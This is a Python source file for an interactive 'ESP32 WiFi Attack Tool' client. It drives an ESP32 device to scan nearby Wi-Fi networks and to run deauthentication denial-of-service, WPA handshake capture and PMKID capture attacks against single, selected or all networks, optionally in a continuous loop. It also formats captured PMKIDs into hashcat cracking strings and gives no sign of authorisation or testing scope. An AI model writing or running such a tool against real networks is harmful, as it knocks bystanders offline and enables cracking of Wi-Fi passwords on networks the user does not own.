import requests
import struct
import time
import binascii
import subprocess
import platform
import tempfile
import os
import logging
from colorlog import ColoredFormatter
from tabulate import tabulate
try:
    import netifaces
except ImportError:
    netifaces = None

# Configure colored logging
logger = logging.getLogger('ESP32WiFiAttackTool')
logger.setLevel(logging.INFO)
formatter = ColoredFormatter(
    "%(log_color)s%(asctime)s - %(levelname)s - %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
    log_colors={
        'DEBUG': 'cyan',
        'INFO': 'green',
        'WARNING': 'yellow',
        'ERROR': 'red',
        'CRITICAL': 'red,bg_white',
    }
)
handler = logging.StreamHandler()
handler.setFormatter(formatter)
logger.addHandler(handler)

class ESP32WiFiAttackTool:
    def __init__(self, base_url="http://192.168.4.1"):
        self.base_url = base_url
        self.attack_types = {
            'PASSIVE': 0,
            'HANDSHAKE': 1,
            'PMKID': 2,
            'DOS': 3
        }
        self.attack_methods = {
            1: ['DEAUTH_ROGUE_AP', 'DEAUTH_BROADCAST', 'CAPTURE_ONLY'],
            3: ['DEAUTH_ROGUE_AP', 'DEAUTH_BROADCAST', 'DEAUTH_COMBINE_ALL']
        }
        self.attack_state_enum = {
            0: 'READY',
            1: 'RUNNING',
            2: 'FINISHED',
            3: 'TIMEOUT'
        }
        self.max_timeout = 225  # Maximum timeout in seconds
        self.wifi_name = "ManagementAP"
        self.wifi_ssid = "ManagementAP"
        self.wifi_password = "mgmtadmin"

    def check_api_connectivity(self):
        """Check if the API server is reachable."""
        try:
            response = requests.get(f"{self.base_url}/status", timeout=5)
            return response.status_code == 200
        except requests.RequestException:
            logger.error("Server disconnected or unreachable!")
            return False

    def reconnect_wifi(self):
        """Attempt to reconnect to the ManagementAP WiFi network."""
        system = platform.system()
        if system == "Windows":
            return self._reconnect_wifi_windows()
        elif system == "Linux":
            return self._reconnect_wifi_linux()
        elif system == "Darwin":
            return self._reconnect_wifi_macos()
        else:
            logger.error(f"Unsupported platform: {system}")
            return False

    def _reconnect_wifi_windows(self):
        """Reconnect to ManagementAP on Windows using netsh."""
        try:
            logger.info("Scanning for available WiFi networks...")
            scan_result = subprocess.run(
                ['netsh', 'wlan', 'show', 'profiles'],
                capture_output=True, text=True, timeout=15
            )
            if scan_result.returncode != 0:
                logger.error(f"Failed to scan WiFi profiles: {scan_result.stderr}")
                return False

            if self.wifi_name not in scan_result.stdout:
                logger.warning(f"WiFi profile '{self.wifi_name}' not found. Creating new profile...")
                return self._create_and_connect_profile_windows()

            logger.info("Refreshing network list...")
            subprocess.run(['netsh', 'wlan', 'refresh'], capture_output=True, timeout=10)
            time.sleep(2)

            available_result = subprocess.run(
                ['netsh', 'wlan', 'show', 'network'],
                capture_output=True, text=True, timeout=10
            )
            if available_result.returncode == 0 and self.wifi_ssid in available_result.stdout:
                logger.info(f"Network '{self.wifi_ssid}' found in scan results.")
            else:
                logger.warning(f"Network '{self.wifi_ssid}' not visible in current scan.")

            logger.info(f"Attempting to connect to {self.wifi_name}...")
            connect_result = subprocess.run(
                ['netsh', 'wlan', 'connect', f'name={self.wifi_name}', f'ssid={self.wifi_ssid}'],
                capture_output=True, text=True, timeout=15
            )
            if connect_result.returncode == 0 and "Connection request was completed successfully" in connect_result.stdout:
                logger.info("Connection request was completed successfully.")
                return self._verify_connection_windows()
            else:
                logger.error(f"Failed to connect to {self.wifi_name}: {connect_result.stderr or connect_result.stdout}")
                return self._try_alternative_connection_windows()
        except subprocess.SubprocessError as e:
            logger.error(f"Error during WiFi reconnection: {e}")
            return False
        except subprocess.TimeoutExpired:
            logger.error("WiFi operation timed out.")
            return False

    def _create_and_connect_profile_windows(self):
        """Create a new WiFi profile and connect on Windows."""
        try:
            profile_xml = f'''<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{self.wifi_name}</name>
    <SSIDConfig>
        <SSID>
            <name>{self.wifi_ssid}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{self.wifi_password}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>'''
            with tempfile.NamedTemporaryFile(mode='w', suffix='.xml', delete=False) as f:
                f.write(profile_xml)
                temp_profile = f.name
            try:
                add_result = subprocess.run(
                    ['netsh', 'wlan', 'add', 'profile', f'filename={temp_profile}'],
                    capture_output=True, text=True, timeout=10
                )
                if add_result.returncode == 0:
                    logger.info(f"Created WiFi profile for {self.wifi_name}")
                    connect_result = subprocess.run(
                        ['netsh', 'wlan', 'connect', f'name={self.wifi_name}'],
                        capture_output=True, text=True, timeout=15
                    )
                    return connect_result.returncode == 0
                else:
                    logger.error(f"Failed to create profile: {add_result.stderr}")
                    return False
            finally:
                try:
                    os.unlink(temp_profile)
                except:
                    pass
        except Exception as e:
            logger.error(f"Error creating profile: {e}")
            return False

    def _try_alternative_connection_windows(self):
        """Try alternative connection methods on Windows."""
        try:
            logger.info("Trying disconnect and reconnect...")
            subprocess.run(['netsh', 'wlan', 'disconnect'], capture_output=True, timeout=5)
            time.sleep(2)
            connect_result = subprocess.run(
                ['netsh', 'wlan', 'connect', f'name={self.wifi_name}'],
                capture_output=True, text=True, timeout=15
            )
            if connect_result.returncode == 0:
                return self._verify_connection_windows()
            logger.info("Trying connection by SSID...")
            connect_result = subprocess.run(
                ['netsh', 'wlan', 'connect', f'ssid={self.wifi_ssid}'],
                capture_output=True, text=True, timeout=15
            )
            return connect_result.returncode == 0 and self._verify_connection_windows()
        except Exception as e:
            logger.error(f"Error in alternative connection: {e}")
            return False

    def _verify_connection_windows(self):
        """Verify connection to ManagementAP on Windows."""
        try:
            time.sleep(3)
            status_result = subprocess.run(
                ['netsh', 'wlan', 'show', 'interface'],
                capture_output=True, text=True, timeout=10
            )
            if status_result.returncode == 0 and "State" in status_result.stdout and "connected" in status_result.stdout.lower():
                if self.wifi_ssid in status_result.stdout:
                    logger.info(f"Successfully connected to {self.wifi_ssid}")
                    return True
                else:
                    logger.error("Connected to WiFi but not the target network")
                    return False
            else:
                logger.error("WiFi interface not in connected state")
                return False
        except Exception as e:
            logger.error(f"Error verifying connection: {e}")
            return False

    def _reconnect_wifi_linux(self):
        """Reconnect to ManagementAP on Linux using nmcli."""
        if not netifaces:
            logger.error("netifaces module required for Linux WiFi reconnection. Install with 'pip install netifaces'.")
            return False
        try:
            logger.info("Scanning for WiFi networks...")
            subprocess.run(['nmcli', 'device', 'wifi', 'rescan'], capture_output=True, timeout=10)
            time.sleep(2)
            scan_result = subprocess.run(
                ['nmcli', '--terse', '--fields', 'SSID', 'device', 'wifi', 'list'],
                capture_output=True, text=True, timeout=10
            )
            if scan_result.returncode != 0 or self.wifi_ssid not in scan_result.stdout:
                logger.error(f"Network '{self.wifi_ssid}' not found in scan.")
                return False
            logger.info(f"Attempting to connect to {self.wifi_ssid}...")
            connect_result = subprocess.run(
                ['nmcli', 'connection', 'up', self.wifi_name, 'ifname', self._get_wifi_interface_linux()],
                capture_output=True, text=True, timeout=15
            )
            if connect_result.returncode != 0:
                logger.warning(f"Failed to connect. Creating new connection for {self.wifi_ssid}...")
                subprocess.run(
                    ['nmcli', 'connection', 'add', 'type', 'wifi', 'con-name', self.wifi_name, 'ssid', self.wifi_ssid,
                     'wifi-sec.key-mgmt', 'wpa-psk', 'wifi-sec.psk', self.wifi_password],
                    capture_output=True, timeout=10
                )
                connect_result = subprocess.run(
                    ['nmcli', 'connection', 'up', self.wifi_name, 'ifname', self._get_wifi_interface_linux()],
                    capture_output=True, text=True, timeout=15
                )
            return connect_result.returncode == 0 and self._verify_connection_linux()
        except subprocess.SubprocessError as e:
            logger.error(f"Error during WiFi reconnection: {e}")
            return False
        except subprocess.TimeoutExpired:
            logger.error("WiFi operation timed out.")
            return False

    def _get_wifi_interface_linux(self):
        """Get the WiFi interface name on Linux."""
        try:
            interfaces = netifaces.interfaces()
            for iface in interfaces:
                if 'wlan' in iface or 'wifi' in iface:
                    return iface
            logger.error("No WiFi interface found.")
            return None
        except Exception as e:
            logger.error(f"Error getting WiFi interface: {e}")
            return None

    def _verify_connection_linux(self):
        """Verify connection to ManagementAP on Linux."""
        try:
            status_result = subprocess.run(
                ['nmcli', '--terse', '--fields', 'NAME,STATE', 'connection', 'show'],
                capture_output=True, text=True, timeout=10
            )
            if status_result.returncode == 0 and f"{self.wifi_name}:activated" in status_result.stdout:
                logger.info(f"Successfully connected to {self.wifi_ssid}")
                return True
            logger.error("Not connected to target network.")
            return False
        except Exception as e:
            logger.error(f"Error verifying connection: {e}")
            return False

    def _reconnect_wifi_macos(self):
        """Reconnect to ManagementAP on macOS using networksetup."""
        if not netifaces:
            logger.error("netifaces module required for macOS WiFi reconnection. Install with 'pip install netifaces'.")
            return False
        try:
            interface = self._get_wifi_interface_macos()
            if not interface:
                return False
            logger.info(f"Turning WiFi {interface} off and on...")
            subprocess.run(['sudo', 'networksetup', '-setairportpower', interface, 'off'], capture_output=True, timeout=5)
            time.sleep(1)
            subprocess.run(['sudo', 'networksetup', '-setairportpower', interface, 'on'], capture_output=True, timeout=5)
            time.sleep(2)
            logger.info(f"Attempting to connect to {self.wifi_ssid}...")
            connect_result = subprocess.run(
                ['sudo', 'networksetup', '-setairportnetwork', interface, self.wifi_ssid, self.wifi_password],
                capture_output=True, text=True, timeout=15
            )
            if connect_result.returncode == 0:
                logger.info(f"Successfully connected to {self.wifi_ssid}")
                return self._verify_connection_macos()
            else:
                logger.error(f"Failed to connect: {connect_result.stderr}")
                return False
        except subprocess.SubprocessError as e:
            logger.error(f"Error during WiFi reconnection: {e}")
            return False
        except subprocess.TimeoutExpired:
            logger.error("WiFi operation timed out.")
            return False

    def _get_wifi_interface_macos(self):
        """Get the WiFi interface name on macOS."""
        try:
            interfaces = netifaces.interfaces()
            for iface in interfaces:
                if 'en' in iface:  # Common WiFi interface prefix on macOS
                    return iface
            logger.error("No WiFi interface found.")
            return None
        except Exception as e:
            logger.error(f"Error getting WiFi interface: {e}")
            return None

    def _verify_connection_macos(self):
        """Verify connection to ManagementAP on macOS."""
        try:
            status_result = subprocess.run(
                ['networksetup', '-getairportnetwork', self._get_wifi_interface_macos()],
                capture_output=True, text=True, timeout=10
            )
            if status_result.returncode == 0 and self.wifi_ssid in status_result.stdout:
                logger.info(f"Successfully connected to {self.wifi_ssid}")
                return True
            logger.error("Not connected to target network.")
            return False
        except Exception as e:
            logger.error(f"Error verifying connection: {e}")
            return False

    def get_status(self):
        try:
            response = requests.get(f"{self.base_url}/status", timeout=5)
            if response.status_code == 200:
                data = response.content
                attack_state = struct.unpack('B', data[0:1])[0]
                attack_type = struct.unpack('B', data[1:2])[0]
                attack_content_size = struct.unpack('H', data[2:4])[0]
                attack_content = data[4:]
                return {
                    'state': attack_state,
                    'type': attack_type,
                    'content_size': attack_content_size,
                    'content': attack_content
                }
            return None
        except requests.RequestException as e:
            #logger.error(f"Error getting status: {e}")
            return None

    def get_ap_list(self):
        try:
            response = requests.get(f"{self.base_url}/ap-list", timeout=10)
            if response.status_code == 200:
                aps = []
                data = response.content
                for i in range(0, len(data), 40):
                    ssid = data[i:i+32].decode('utf-8').rstrip('\x00')
                    bssid = ':'.join([f"{b:02x}" for b in data[i+33:i+39]])
                    rssi = data[i+39] - 255
                    aps.append({'id': i // 40, 'ssid': ssid, 'bssid': bssid, 'rssi': rssi})
                return aps
            return []
        except requests.RequestException as e:
            logger.error(f"Error getting AP list: {e}")
            self.reconnect_wifi()
            aps = self.get_ap_list()
            while True:
                if aps:
                    break
                else:
                    logger.error("Failed to scan networks, server may be disconnected. Continuing... wait 5sec")
                    time.sleep(5)
                    self.reconnect_wifi()
            return aps

    def run_attack(self, ap_id, attack_type, attack_method, timeout):
        try:
            method_index = 0
            if attack_type in self.attack_methods and attack_method:
                if attack_method not in self.attack_methods[attack_type]:
                    logger.error(f"Invalid attack method for type {attack_type}")
                    return False
                method_index = self.attack_methods[attack_type].index(attack_method)
            data = struct.pack('BBBB', ap_id, attack_type, method_index, timeout)
            response = requests.post(f"{self.base_url}/run-attack", data=data, timeout=5)
            return response.status_code == 200
        except requests.RequestException as e:
            logger.info("       Attack submitted (ESP32 may disconnect WiFi during attack, ManagementAP may be temporarily unavailable).")
            
            return False

    def reset_attack(self):
        try:
            response = requests.head(f"{self.base_url}/reset", timeout=5)
            return response.status_code == 200
        except requests.RequestException as e:
            logger.error(f"Error resetting attack: {e}")
            return False

    def format_pmkid(self, content, content_size):
        index = 0
        mac_ap = ''.join([f"{b:02x}" for b in content[index:index+6]])
        index += 6
        mac_sta = ''.join([f"{b:02x}" for b in content[index:index+6]])
        index += 6
        ssid_len = content[index]
        ssid = ''.join([f"{b:02x}" for b in content[index+1:index+1+ssid_len]])
        ssid_text = content[index+1:index+1+ssid_len].decode('utf-8', errors='ignore')
        index += ssid_len + 1
        pmkid = ''.join([f"{b:02x}" for b in content[index:index+content_size]])
        return {
            'mac_ap': mac_ap,
            'mac_sta': mac_sta,
            'ssid': ssid,
            'ssid_text': ssid_text,
            'pmkid': pmkid,
            'hashcat': f"{pmkid}*{mac_ap}*{mac_sta}*{ssid}"
        }

    def format_handshake(self, content, content_size):
        handshakes = ''.join([f"{b:02x}" for b in content[:content_size]])
        return {
            'handshakes': handshakes[:100] + '...' if len(handshakes) > 100 else handshakes,
            'pcap': f"{self.base_url}/capture.pcap",
            'hccapx': f"{self.base_url}/capture.hccapx"
        }

    def display_menu(self):
        # First, check if the ESP32 API is accessible before showing the menu
        self.reconnect_wifi()
        logger.info("Checking API connectivity...")
        if not self.check_api_connectivity():
            logger.error("Cannot connect to ESP32 ManagementAP API. Please ensure you are connected to the correct WiFi network.")
            return "5"  # Return 'Exit' option to gracefully exit
        menu = """
        === ESP32 WiFi Attack Tool ===
        1. Scan WiFi Networks
        2. Attack Single Network
        3. Attack Multiple Selected Networks
        4. Attack All Networks
        5. Exit
"""
        logger.info(menu.strip())
        return input("Select option: ")

    def display_aps(self, aps):
        if not aps:
            logger.warning("No networks found!")
            return
        headers = ["ID", "SSID", "BSSID", "RSSI"]
        table = [[ap['id'], ap['ssid'], ap['bssid'], ap['rssi']] for ap in aps]
        logger.info("\n" + tabulate(table, headers, tablefmt="grid"))

    def get_attack_config(self):
        logger.info("\nAvailable Attack Types:")
        for i, attack_type in enumerate(self.attack_types, 1):
            logger.info(f"{i}. {attack_type}")
        attack_choice = int(input("Select attack type (1-4): ")) - 1
        attack_type = list(self.attack_types.values())[attack_choice]

        method = None
        if attack_type in self.attack_methods:
            logger.info("\nAvailable Attack Methods:")
            for i, m in enumerate(self.attack_methods[attack_type], 1):
                logger.info(f"{i}. {m}")
            method_choice = int(input("Select attack method (1-{}): ".format(len(self.attack_methods[attack_type])))) - 1
            method = self.attack_methods[attack_type][method_choice]

        duration = input("Enter attack duration ('loop' for continuous, or seconds, e.g., 3600 for 1 hour): ")
        continuous = duration.lower() == 'loop'
        timeout = self.max_timeout if continuous else max(5, min(int(duration), self.max_timeout))
        return attack_type, method, timeout, continuous

    def select_multiple_aps(self, aps):
        while True:
            self.display_aps(aps)
            ids = input("\nEnter AP IDs to attack (comma-separated, e.g., 0,1,2,3.. or again scan [scan]): ")
            if ids.lower() != "scan":
                break
            else:
                aps = self.get_ap_list()
        try:
            ap_ids = [int(x.strip()) for x in ids.split(',')]
            selected_aps = [ap for ap in aps if ap['id'] in ap_ids]
            if not selected_aps:
                logger.error("No valid AP IDs selected!")
                return []
            return selected_aps
        except ValueError:
            logger.error("Invalid input! Please enter valid AP IDs.")
            return []

    def attack_network(self, ap, attack_type, attack_method, timeout, continuous=False):
        logger.info(f"\nAttacking {ap['ssid']} ({ap['bssid']})")
        cycle_count = 0
        max_retries = 3
        retry_interval = 5
        try:
            while True:
                cycle_count += 1
                logger.info(f"Starting attack cycle {cycle_count} (Timeout: {timeout}s)")
                cycle_start_time = time.time()
                if not self.check_api_connectivity():
                    logger.error("Server is disconnected. Attempting to reconnect...")
                    self.reconnect_wifi()
                    continue
                if not self.run_attack(ap['id'], attack_type, attack_method, timeout):
                    logger.info("Attack initiated successfully.")
                    attack_end_time = cycle_start_time + timeout
                    while time.time() < attack_end_time:
                        remaining = attack_end_time - time.time()
                        # Display a loading bar for attack progress
                        bar_length = 30
                        percent = max(0, min(1, (timeout - remaining) / timeout))
                        filled_length = int(bar_length * percent)
                        bar = '█' * filled_length + '-' * (bar_length - filled_length)
                        # Print colored progress bar using ANSI escape codes (green bar, yellow text)
                        print(f"\t\t\r\033[92mAttack running |{bar}|\033[0m \033[93m{int(remaining)}s remaining...\033[0m", end="", flush=True)
                        try:
                            status = self.get_status()
                        except:
                            status  = ""
                        if status:
                            if status['state'] in [self.attack_state_enum['FINISHED'], self.attack_state_enum['TIMEOUT']]:
                                logger.info(f"Attack {'completed' if status['state'] == self.attack_state_enum['FINISHED'] else 'timed out'}")
                                if status['state'] == self.attack_state_enum['FINISHED']:
                                    if attack_type == self.attack_types['PMKID']:
                                        result = self.format_pmkid(status['content'], status['content_size'])
                                        logger.info(f"MAC AP: {result['mac_ap']}")
                                        logger.info(f"MAC STA: {result['mac_sta']}")
                                        logger.info(f"SSID: {result['ssid_text']}")
                                        logger.info(f"Hashcat: {result['hashcat']}")
                                    elif attack_type == self.attack_types['HANDSHAKE']:
                                        result = self.format_handshake(status['content'], status['content_size'])
                                        logger.info(f"Handshakes: {result['handshakes']}")
                                        logger.info(f"PCAP: {result['pcap']}")
                                        logger.info(f"HCCAPX: {result['hccapx']}")
                                self.reset_attack()
                                break
                            time.sleep(1)
                    else:
                        logger.warning("\n\tAttack duration reached, checking final status...")
                        status = self.get_status()
                        if status and status['state'] == self.attack_state_enum['RUNNING']:
                            logger.error("Attack did not complete within timeout, resetting...")
                            self.reset_attack()
                else:
                    logger.error("Failed to initiate attack, possibly AP is off. Retrying after reconnect...")
                    self.reconnect_wifi()
                    continue
                if not continuous:
                    logger.info("Attack cycle completed.")
                    return True
                logger.info("Waiting 10 seconds before next cycle...")
                wait_start = time.time()
                while time.time() - wait_start < 10:
                    remaining_wait = 10 - (time.time() - wait_start)
                    logger.info(f"Post-cycle wait - {remaining_wait:.1f}s remaining...")
                    time.sleep(1)
                    if not self.check_api_connectivity():
                        logger.error(f"Server still unreachable, attempting to reconnect to {self.wifi_name}...")
                        self.reconnect_wifi()
                logger.info("Continuing attack in loop mode...")
        except KeyboardInterrupt:
            logger.info("\nStopping continuous attack...")
            self.reset_attack()
        return True

    def run(self):
        logger.info("Starting ESP32 Wi-Fi Attack Tool...")
        logger.info("\tEnsure you are connected to the ManagementAP WiFi network (password: mgmtadmin).")
        while True:
            choice = self.display_menu()
            if choice == '1':
                logger.info("\nScanning networks...")
                aps = self.get_ap_list()
                if aps:
                    self.display_aps(aps)
                else:
                    logger.error("Failed to scan networks, server may be disconnected. Continuing...")
            elif choice == '2':
                aps = self.get_ap_list()
                if aps:
                    self.display_aps(aps)
                    try:
                        while True:
                            try:
                                ap_id = int(input("Enter AP ID to attack: "))
                                ap = next((ap for ap in aps if ap['id'] == ap_id), None)
                                if ap:
                                    attack_type, attack_method, timeout, continuous = self.get_attack_config()
                                    self.attack_network(ap, attack_type, attack_method, timeout, continuous)
                                    break
                                else:
                                    logger.error("Invalid AP ID. Please try again.")
                            except ValueError:
                                logger.error("Invalid input! Please enter a valid AP ID.")
                    except ValueError:
                        logger.error("Invalid input! Please enter a valid AP ID.")
                else:
                    logger.error("No APs found, server may be disconnected. Continuing...")
            elif choice == '3':
                aps = self.get_ap_list()
                if aps:
                    selected_aps = self.select_multiple_aps(aps)
                    if selected_aps:
                        attack_type, attack_method, timeout, continuous = self.get_attack_config()
                        for ap in selected_aps:
                            self.attack_network(ap, attack_type, attack_method, timeout, continuous)
                            if not continuous:
                                time.sleep(1)
                else:
                    logger.error("No APs found, server may be disconnected. Continuing...")
            elif choice == '4':
                aps = self.get_ap_list()
                if aps:
                    attack_type, attack_method, timeout, continuous = self.get_attack_config()
                    for ap in aps:
                        self.attack_network(ap, attack_type, attack_method, timeout, continuous)
                        if not continuous:
                            time.sleep(1)
                else:
                    logger.error("No APs found, server may be disconnected. Continuing...")
            elif choice == '5':
                # Ask user if they want to try reconnecting or exit
                for attempt in range(5):
                    logger.info("Cannot connect to ESP32 ManagementAP. Do you want to try reconnecting? (y/n): ")
                    user_input = input().strip().lower()
                    if user_input == 'y':
                        logger.info(f"Attempting to reconnect to ManagementAP (attempt {attempt + 1}/5)...")
                        if self.reconnect_wifi() and self.check_api_connectivity():
                            logger.info("Reconnected successfully. Returning to main menu.")
                            break
                        else:
                            logger.error("Reconnect failed.")
                    elif user_input == 'n':
                        logger.info("Exiting...")
                        break
                    else:
                        logger.error("Invalid input. Please enter 'y' or 'n'.")
                else:
                    logger.info("Maximum reconnect attempts reached. Exiting...")
                break
            else:
                logger.error("Invalid option!")
                continue